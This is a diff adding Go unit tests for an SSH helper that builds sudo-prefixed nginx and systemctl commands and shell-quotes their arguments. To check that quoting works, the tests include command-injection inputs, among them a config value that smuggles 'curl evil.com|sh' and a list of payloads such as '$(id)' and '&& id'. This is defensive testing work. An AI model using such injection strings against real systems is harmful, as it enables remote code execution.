@@ -1,0 +1,136 @@
+package ssh
+
+import (
+	"os/exec"
+	"strings"
+	"testing"
+)
+
+func TestBuildCommand_NoSudoForBareNginxV(t *testing.T) {
+	cfg := Config{SudoPrefix: "sudo -n", SystemctlPath: "/bin/systemctl", NginxSbinPath: "/usr/sbin/nginx"}
+	got := buildCommand(cfg, "/usr/sbin/nginx", []string{"-V"})
+	want := "/usr/sbin/nginx -V"
+	if got != want {
+		t.Errorf("buildCommand(nginx -V) = %q, want %q", got, want)
+	}
+}
+
+func TestBuildCommand_SudoForReload(t *testing.T) {
+	cfg := Config{SudoPrefix: "sudo -n", SystemctlPath: "/bin/systemctl", NginxSbinPath: "/usr/sbin/nginx"}
+	got := buildCommand(cfg, "/bin/systemctl", []string{"reload", "nginx.service"})
+	want := "sudo -n /bin/systemctl reload nginx.service"
+	if got != want {
+		t.Errorf("buildCommand(systemctl reload) = %q, want %q", got, want)
+	}
+}
+
+func TestBuildCommand_SudoForNginxT(t *testing.T) {
+	cfg := Config{SudoPrefix: "sudo -n", SystemctlPath: "/bin/systemctl", NginxSbinPath: "/usr/sbin/nginx"}
+	got := buildCommand(cfg, "/usr/sbin/nginx", []string{"-t"})
+	want := "sudo -n /usr/sbin/nginx -t"
+	if got != want {
+		t.Errorf("buildCommand(nginx -t) = %q, want %q", got, want)
+	}
+}
+
+func TestBuildCommand_NoSudoForIsActive(t *testing.T) {
+	cfg := Config{SudoPrefix: "sudo -n", SystemctlPath: "/bin/systemctl", NginxSbinPath: "/usr/sbin/nginx"}
+	got := buildCommand(cfg, "/bin/systemctl", []string{"is-active", "nginx.service"})
+	want := "/bin/systemctl is-active nginx.service"
+	if got != want {
+		t.Errorf("buildCommand(systemctl is-active) = %q, want %q", got, want)
+	}
+}
+
+func TestBuildCommand_ShellEscape(t *testing.T) {
+	cfg := Config{SystemctlPath: "/bin/systemctl"}
+	got := buildCommand(cfg, "echo", []string{"hello world", "with'quote"})
+	want := `echo 'hello world' 'with'\''quote'`
+	if got != want {
+		t.Errorf("buildCommand(escape) = %q, want %q", got, want)
+	}
+}
+
+func TestBuildCommand_SudoPrefixInjectionIsQuoted(t *testing.T) {
+	cfg := Config{SudoPrefix: "sudo -n; curl evil.com|sh; sudo -n", SystemctlPath: "/bin/systemctl", NginxSbinPath: "/usr/sbin/nginx"}
+	got := buildCommand(cfg, "/usr/sbin/nginx", []string{"-t"})
+	// Each whitespace-separated token must be individually quoted; metacharacters cannot escape.
+	// Tokens: "sudo", "-n;", "curl", "evil.com|sh;", "sudo", "-n"
+	// ShellQuote leaves safe tokens bare and single-quotes tokens containing shell metacharacters.
+	want := `sudo '-n;' curl 'evil.com|sh;' sudo -n /usr/sbin/nginx -t`
+	if got != want {
+		t.Errorf("buildCommand(injection) =\n  %q\nwant\n  %q", got, want)
+	}
+}
+
+// CodeQL flags buildCommand as a command-injection sink because the string
+// reaches a remote shell. ShellQuote is the sanitizer, so prove it by running
+// the result through a real shell and checking the argument survives intact.
+func TestBuildCommandNeutralisesShellMetacharacters(t *testing.T) {
+	for _, payload := range []string{
+		"/etc/nginx/nginx.conf; id",
+		"$(id)",
+		"`id`",
+		"a'b",
+		"x\"y",
+		"| id",
+		"&& id",
+		"$IFS",
+	} {
+		t.Run(payload, func(t *testing.T) {
+			// echo is a stand-in for the remote command; what matters is that
+			// the shell receives the payload as one literal argument.
+			cmd := buildCommand(Config{}, "echo", []string{payload})
+
+			out, err := exec.Command("/bin/sh", "-c", cmd).Output()
+			if err != nil {
+				t.Fatalf("running %q: %v", cmd, err)
+			}
+			if got := strings.TrimRight(string(out), "\n"); got != payload {
+				t.Fatalf("payload was interpreted by the shell.\n  command: %s\n  want: %q\n  got:  %q",
+					cmd, payload, got)
+			}
+		})
+	}
+}
+
+// /usr/bin/test only exists on Linux, so the existence probe must use the
+// /bin/test path that both Linux and macOS hosts provide.
+func TestStatCommandUsesPortableTestBinary(t *testing.T) {
+	name, args := statCommand("/var/run/nginx.pid")
+	if name != "/bin/test" {
+		t.Fatalf("statCommand() binary = %q, want /bin/test", name)
+	}
+	want := []string{"-e", "/var/run/nginx.pid"}
+	if len(args) != len(want) || args[0] != want[0] || args[1] != want[1] {
+		t.Fatalf("statCommand() args = %v, want %v", args, want)
+	}
+	got := buildCommand(Config{SudoPrefix: "sudo -n"}, name, args)
+	if got != "/bin/test -e /var/run/nginx.pid" {
+		t.Fatalf("buildCommand(stat) = %q, want an unprivileged /bin/test probe", got)
+	}
+}
+
+// ShellQuote is shared with the setup snippets, so its exact output is part
+// of what operators paste into a root shell.
+func TestShellQuote(t *testing.T) {
+	tests := []struct {
+		in, want string
+	}{
+		{"", "''"},
+		{"/usr/sbin/nginx", "/usr/sbin/nginx"},
+		{"nginx.service", "nginx.service"},
+		{"user@host:22", "user@host:22"},
+		{"hello world", "'hello world'"},
+		{"it's", `'it'\''s'`},
+		{"ssh-ed25519 AAAA nginx-ui@generated", "'ssh-ed25519 AAAA nginx-ui@generated'"},
+		{"$(id)", "'$(id)'"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.in, func(t *testing.T) {
+			if got := ShellQuote(tt.in); got != tt.want {
+				t.Errorf("ShellQuote(%q) = %s, want %s", tt.in, got, tt.want)
+			}
+		})
+	}
+}
